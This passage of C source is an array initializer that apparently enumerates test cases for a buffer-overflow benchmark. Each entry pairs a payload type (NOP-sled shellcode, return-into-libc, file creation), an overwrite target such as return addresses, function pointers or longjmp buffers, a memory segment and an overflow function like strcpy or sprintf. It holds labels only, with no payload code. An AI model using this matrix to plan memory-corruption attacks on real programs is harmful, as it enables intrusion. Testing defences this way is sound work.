    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_BSS, BSS, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, MEMCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, STRCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, STRNCPY},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, SPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, SNPRINTF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, STRCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, STRNCAT},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, SSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, FSCANF},
    {DIRECT, INJECTED_CODE_SIMPLE_NOP, LONGJMP_BUF_DATA, DATA, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, RET_ADDR, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, OLD_BASE_PTR, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_BSS, BSS, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, FUNC_PTR_DATA, DATA, HOMEBREW},

    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_BSS, BSS, HOMEBREW},
    
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, MEMCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, STRCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, STRNCPY},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, SPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, SNPRINTF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, STRCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, STRNCAT},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, SSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, FSCANF},
    {DIRECT, INJECTED_CODE_POLY_NOP, LONGJMP_BUF_DATA, DATA, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, RET_ADDR, STACK, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, OLD_BASE_PTR, STACK, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_BSS, BSS, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, FUNC_PTR_DATA, DATA, HOMEBREW},

    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_VAR, STACK, HOMEBREW},

    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_STACK_PARAM, STACK, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_HEAP, HEAP, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_BSS, BSS, HOMEBREW},
    
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, MEMCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, STRCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, STRNCPY},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, SPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, SNPRINTF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, STRCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, STRNCAT},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, SSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, FSCANF},
    {DIRECT, RETURN_INTO_LIBC, LONGJMP_BUF_DATA, DATA, HOMEBREW},

    {DIRECT, CREATE_FILE, RET_ADDR, STACK, MEMCPY},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, STRCPY},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, STRNCPY},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, SPRINTF},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, SNPRINTF},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, STRCAT},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, STRNCAT},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, SSCANF},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, FSCANF},
    {DIRECT, CREATE_FILE, RET_ADDR, STACK, HOMEBREW},
    
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, MEMCPY},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, STRCPY},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, STRNCPY},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, SPRINTF},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, SNPRINTF},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, STRCAT},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, STRNCAT},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, SSCANF},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, FSCANF},
    {DIRECT, CREATE_FILE, OLD_BASE_PTR, STACK, HOMEBREW},
    
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, MEMCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, STRCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, STRNCPY},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, SPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, SNPRINTF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, STRCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, STRNCAT},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, SSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, FSCANF},
    {DIRECT, CREATE_FILE, FUNC_PTR_STACK_VAR, STACK, HOMEBREW},

